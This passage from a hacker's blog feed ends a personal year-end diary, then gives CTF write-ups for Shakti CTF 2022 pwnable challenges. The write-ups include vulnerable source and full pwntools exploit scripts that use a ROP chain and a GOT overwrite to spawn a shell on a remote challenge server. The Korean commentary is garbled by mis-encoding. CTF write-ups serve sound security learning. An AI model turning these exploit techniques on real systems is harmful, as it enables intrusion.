program. My role in the program was prepared for basic English lectures on overall security. I remember preparing for about two months from April.</li></ol><ul><li>related article: <a href="https://www.dailysecu.com/news/articleView.html?idxno=137993&amp;fbclid=IwAR2qQR6MNc4djC_ACV__bc0kqmpdXiEW9P4rGU5VtwmZcv3kKd6iVn_d-58&amp;fs=e&amp;s=cl">https://www.dailysecu.com/news/articleView.html?idxno=137993&amp;fbclid=IwAR2qQR6MNc4djC_ACV__bc0kqmpdXiEW9P4rGU5VtwmZcv3kKd6iVn_d-58&amp;fs=e&amp;s=cl</a></li></ul><ol start="2"><li><p>I was prepared Chungbuk Hacking Camp system hacking lecture and Pwnable field of CTF. The CDDC above was an online lecture, but this Chungbuk Hacking Camp lecture was an offline. I remember being very nervous because it was my first offline presentation. It was disappointing that out of 20 high school students, there were only 1 or 2 students who focused more on Pwnable than expected. However, I felt fortunate that I prepared a really basic lecture. I remember that this was in July.</p></li><li><p>I gave a presentation of Summer Hacking camp. And I wrote a Pwanble challenge for the CTF held in there. The presentation was prepared with a senior from the previous company. I donâ€™t remember exactly when, but I remember it was after the Hacking camp in Chungbuk. The topic of the presentation is my history of system hacking up to this point. I thought it was enough to share the experience because I completed BoB shortly after I started studying and joined the company right away. However, now I am confident that I have grown much more skillfully than I did back then. If there are good results in my personal research, I would like to make a presentation at Hacking Camp with technical content next time.</p></li><li><p>I wrote a Pwnable challenge for the Womenâ€™s Hacking Contest Power Of XX. There were two challenges each in the preliminaries and finals. In the finals, I wrote a one more challenge for Misk. This is November, and it is the time when I left the company. Thatâ€™s why I had relatively more time, so I did a lot of research on the challenge, and Iâ€™m attached to it. Information on the challenge is attached below.</p></li></ol><ul><li><a href="https://jiravvit.github.io/221121-poxx2022-shop_revenge/">https://jiravvit.github.io/221121-poxx2022-shop_revenge/</a></li></ul><h2 id="New-beginnings-with-MacBook-Air-M2"><a href="#New-beginnings-with-MacBook-Air-M2" class="headerlink" title="New beginnings (with MacBook Air M2)"></a>New beginnings (with MacBook Air M2)</h2><p>After leaving the scompany, everything changed. I always hacked with an anxious and urgent mindset, but now I have a time to spare. Itâ€™s a fun and happy feeling. I received a MacBook as a gift this time, and I feel happier because I use it. Speaking of Mac, I have been using Windows, Linux, and Mac OS this year. Iâ€™ve been using Linux for about 3 months and Mac for about a month, but I like Mac the most. It is the prettiest and most sophisticated feeling.</p><p>Anyway, Iâ€™m happy to be able to greet 2023 with a new MacBook. I feel like I can live happily ever after. I will have to use my MacBook for the rest of my life! ;)</p><br><img src="/images/221231-diary/221231-mac.png" width="450"/>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shakti CTF 2022 - ropwork (hard)</title>
      <link href="/221222-shaktictf2022-ropwork/"/>
      <url>/221222-shaktictf2022-ropwork/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(9&#x2F;387) solves</p><p>Hard</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>The fisherman is trying to untangle his fishing knots. If you could help him with it, it would be great!</p><p>Note:<br>The server is running on Ubuntu 20.04<br>The flag file found on the server is given a random name.<br>Author: d1g174l_f0rtr355</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropework_460328c6-afec-4492-9b9f-97a1f35c71af: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.31.so, for GNU/Linux 3.2.0, BuildID[sha1]=8186a401dd45223b37552a01bd54666547a11437, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fd000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;The fisherman is trying to untangle his fishing knots. If you could help him with it, it would be great!\n&#x27;&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">329</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;Ok bye!\n&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ëŒ€ë†“ê³  bof í„°ì§„ë‹¤.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>fgets</code> í•¨ìˆ˜ì—ì„œ ë³€ìˆ˜ ì‚¬ì´ì¦ˆë³´ë‹¤ ë” í° ê°’ì„ ì“¸ ìˆ˜ ìžˆì–´ì„œ bofê°€ í„°ì§„ë‹¤.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>bss + 0x20 ì—ë‹¤ê°€ &#x2F;bin&#x2F;sh ì¨ì£¼ê³  system í•¨ìˆ˜ ì¸ìžë¡œ ì´ê±¸ ì¤˜ì„œ ì‹¤í–‰ì‹œì¼°ë‹¤.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.2.136.80&#x27;</span>, <span class="number">31825</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">xor_rax = <span class="number">0x401182</span></span><br><span class="line">pop_rdi = <span class="number">0x401273</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401271</span></span><br><span class="line">xor_rdx_rbx = <span class="number">0x040118e</span></span><br><span class="line">syscall = <span class="number">0x4011a2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(e.bss()+<span class="number">0x20</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(xor_rdx_rbx)</span><br><span class="line">payload += p64(xor_rax) <span class="comment"># sys_read</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span>+ <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(e.bss()+<span class="number">0x20</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h3><p>ì²˜ìŒì— csu ê°€ì ¯ìœ¼ë¡œ ë¬¸ì œë¥¼ í’€ë ¤ê³  í–ˆì—ˆëŠ”ë° ë­”ê°€ ìž˜ ì•ˆë˜ì–´ì„œ ë‹¤ë¥¸ ë°©ë²• ìƒê°í•´ë³´ë‹¤ê°€ ë¬¸ì œë¥¼ í’€ì—ˆë‹¤. ì—­ì‹œ.. ë¡¸ì—…ì€ ë¬¸ì œ í’€ê³  ë°”ë¡œë°”ë¡œ ìž‘ì„±í•´ì•¼ ìƒìƒí•˜ê²Œ ì ì„ ìˆ˜ ìžˆëŠ” ê²ƒ ê°™ë‹¤.. (ë‹¤ì‹œ í’€ê¸´.. ì¢€..) ì´ì œ ë¡¸ì—… ì•ˆë¯¸ë£¨ê³  ìž˜ ì ì„ ê²ƒì´ë‹¤..</p><p>ì•„ ê·¸ë¦¬ê³  ì´ ì”¨í…ì—ì„œ ë¡¸ì—…ìœ¼ë¡œ ì ì€ ì„¸ ë¬¸ì œ ë§ê³  easy 2ë¬¸ì œì™€ meduim í•œ ë¬¸ì œê°€ ìžˆì—ˆë‹¤. easyëŠ” ë„ˆë¬´ ì‰¬ì›Œì„œ ë¡¸ì—… ì—…ë¡œë“œë¥¼ ì•ˆí•˜ë ¤ê³  í•œë‹¤. (ì†”ë¸Œê°€ ê±°ì˜ 60~70ì´ë‹¤.) mediumì€ ëª»í’€ì—ˆëŠ”ë° ì—°ê²°ë¦¬ìŠ¤íŠ¸ êµ¬í˜„ ê´€ë ¨ëœ ë¬¸ì œì´ë‹¤. ì—°ê²°ë¦¬ìŠ¤íŠ¸ê°€ ë­”ì§€ ê¹Œë¨¹ì–´ì„œ.. ctf ê¸°ê°„ ë•Œ ì—°ê²°ë¦¬ìŠ¤íŠ¸ ê³µë¶€í–ˆë˜ ê¸°ì–µì´ ë‚œë‹¤.<br>ì•„ë¬´íŠ¼ ì´ ì”¨í…ì—ì„œ í¬ë„ˆë¸”ì´ ì´ 6ê°œì˜€ëŠ”ë° í•œ ë¬¸ì œ ë¹¼ê³  ë‹¤ í’€ì–´ì„œ ê¸°ë¶„ì´ êµ‰ìž¥ížˆ ì¢‹ì•˜ë‹¤. ë‚¨ì€ ì—°ê²°ë¦¬ìŠ¤íŠ¸ ê´€ë ¨ ë¬¸ì œëŠ” ê²°êµ­ ë¡¸ì—…ì„ ë´¤ëŠ”ë° heapì—ì„œ unsafe-unlinkë¼ëŠ” ê¸°ë²•ì„ ì‚¬ìš©í•˜ì—¬ ìµìŠ¤ë¥¼ í•˜ëŠ” ë¬¸ì œì´ë‹¤. ê°œì¸ì ìœ¼ë¡œ heap ê´€ë ¨ ë¬¸ì œëŠ” ë‚´ê°€ heapì„ ê³µë¶€ë¥¼ ì œëŒ€ë¡œ ì•ˆí–ˆê¸° ë•Œë¬¸ì— í’€ì§€ ì•ŠëŠ”ë‹¤.(?????) í‰ìƒ ì•ˆí•  ê³„íšì€ ì•„ë‹ˆê³  ë‚´ë…„ìœ¼ë¡œ ë¯¸ë¤„ë‘¬ì•¼ì§€.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Shakti </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Shakti CTF 2022 - phrack_crack (hard)</title>
      <link href="/221222-shaktictf2022-phrack_crack/"/>
      <url>/221222-shaktictf2022-phrack_crack/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(9&#x2F;387) solves</p><p>Hard</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>phrack_phrack_phrack_crack_crack_crack.<br>Note: The server is running on Ubuntu 20.04.<br>Author: d1g174l_f0rtr355</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ ld.so.2</span><br><span class="line">â”œâ”€â”€ libc.so.6</span><br><span class="line">â””â”€â”€ phrack_crack</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phrack_crack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=06dd3b9850dc326bd98cb17e0049bcec4bd15219, not stripped</span><br></pre></td></tr></table></figure><p>ldì™€ libcê°€ ì£¼ì–´ì¡Œìœ¼ë‹ˆ patchelfë¥¼ ì´ìš©í•´ì„œ íŒ¨ì¹˜í•´ì£¼ê³  ë¬¸ì œí’€ì´ë¥¼ í•˜ì˜€ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux-vdso.so.1 (0x00007ffc78b1f000)</span><br><span class="line">./libc.so.6 (0x00007f8d6e200000)</span><br><span class="line">./ld.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f8d6e69d000)</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fd000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">=======================</span><br><span class="line"> | Welcome Phrack 66 |</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">Here&#x27;s a generous leak for you! 0x7fc34a06dba0</span><br><span class="line"></span><br><span class="line">Here&#x27;s one more generous leak for you: 0x961220</span><br><span class="line"></span><br><span class="line">MENU</span><br><span class="line"></span><br><span class="line">1. malloc 0/4</span><br><span class="line">2. edit</span><br><span class="line">3. target</span><br><span class="line">4. quit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>ì›í•˜ëŠ” ì‚¬ì´ì¦ˆë§Œí¼ íž™ì— ë°ì´í„°ë¥¼ í• ë‹¹ ê°€ëŠ¥í•˜ê³ .. ì›í•˜ëŠ” ì¸ë±ìŠ¤(?)ì— ë‚´ìš©ì„ ìˆ˜ì • ê°€ëŠ¥í•˜ë‹¤.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter index: &quot;</span>);</span><br><span class="line">  v5 = getint(<span class="number">8LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No negative indices allowed!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;maximum requests reached!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !m_array[v5] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Index not allocated!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  get_inp(m_array[v5], (<span class="type">unsigned</span> <span class="type">int</span>)(size + <span class="number">10</span>));</span><br></pre></td></tr></table></figure><p>ì¸ë±ìŠ¤ë¥¼ ìž…ë ¥ë°›ì§€ë§Œ ì •ìž‘ ê²€ì¦í•˜ëŠ” ì¸ë±ìŠ¤ëŠ” ì—‰ëš±í•œ ê°’ì´ë¼ì„œ oobê°€ ë°œìƒí•œë‹¤. </p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>ì¶œë ¥í•´ì£¼ëŠ” ê°’ì„ í†µí•´ ë¦½ì‹œ ë² ì´ìŠ¤ëž‘ íž™ ì£¼ì†Œë¥¼ ìžì—°ìŠ¤ëŸ½ê²Œ ì•Œ ìˆ˜ ìžˆë‹¤.<br>1ë²ˆ ë©”ë‰´ë¥¼ ì´ìš©í•˜ì—¬ íž™ì„ í• ë‹¹í•œ ë‹¤ìŒ malloc gotë¥¼ ì ì–´ë†“ê³  oobê°€ ë°œìƒí•˜ë‹ˆ malloc gotê°€ ì¨ì§„ ì£¼ì†Œì— ì ‘ê·¼í•´ì„œ 2ë²ˆ ë©”ë‰´ë¥¼ ì´ìš©í•˜ì—¬ malloc gotë¥¼ system ì£¼ì†Œë¡œ ë®ì„ ìˆ˜ ìžˆë‹¤.<br>ê·¸ë¦¬ê³  ë‹¤ì‹œ 1ë²ˆ ë©”ë‰´ë¥¼ ì´ìš©í•˜ë©´ systemìœ¼ë¡œ ë®í˜€ì§„ mallocì´ ì‹¤í–‰ë í…ë° ì´ë•Œ ì¸ìžë¥¼ ìš°ë¦¬ì˜ ìž…ë ¥ê°’ìœ¼ë¡œ ì¡°ì ˆí•  ìˆ˜ ìžˆë‹¤. &#x2F;bin&#x2F;shë¥¼ ë³´ë‚´ì£¼ë©´ ì„±ê³µ.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.2.136.80&#x27;</span>, <span class="number">30930</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc.address = leak - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">heap = heap + <span class="number">0x10e0</span></span><br><span class="line">idx = (heap-<span class="number">0x4040c0</span>)//<span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(idx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc , malloc_got</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, p64(<span class="number">0x404048</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc_got -&gt; system</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;data:&#x27;</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>ë„ˆë¬´ ëŠ¦ê²Œ ë¡¸ì—…ì„ ìž‘ì„±í•œë‹¤ ã…Ž.. ê°œì¸ì ìœ¼ë¡œ ë¬¸ì œ ì½”ë“œì— mallocì´ ë‚˜ì˜¤ë©´ ê¸´ìž¥í•˜ëŠ” íŽ¸ì¸ë° ë°”ë¡œ ì·¨ì•½ì ì„ ì°¾ê³  ìƒê°ë³´ë‹¤ ë¹ ë¥´ê²Œ ìµìŠ¤í–ˆë˜ ê¸°ì–µì´ ë‚œë‹¤.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Shakti </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shakti CTF 2022 - game_of_thrones (medium)</title>
      <link href="/221214-shaktictf2022-game_of_thrones/"/>
      <url>/221214-shaktictf2022-game_of_thrones/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(10&#x2F;387) solves</p><p>MediumT</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Help capture kingâ€™s landing and defeat the night walkers and his army of the dead!<br>Note: The server is running on Ubuntu 20.04.<br>Author: d1g174l_f0rtr355</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ chall_dd0d7c74-c5fb-41f8-850f-2f82d6b6495c</span><br><span class="line">â””â”€â”€ libc.so.6</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chall_dd0d7c74-c5fb-41f8-850f-2f82d6b6495c: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /glibc/2.27/64/lib/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d246cab5927d94da0823f90a45d0373f433066ab, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  initialize(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\n=================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;|\tWelcome to Game of Thrones (GOT)\t|&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=================================================\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The goal is simple! You need to become the ruler of the seven 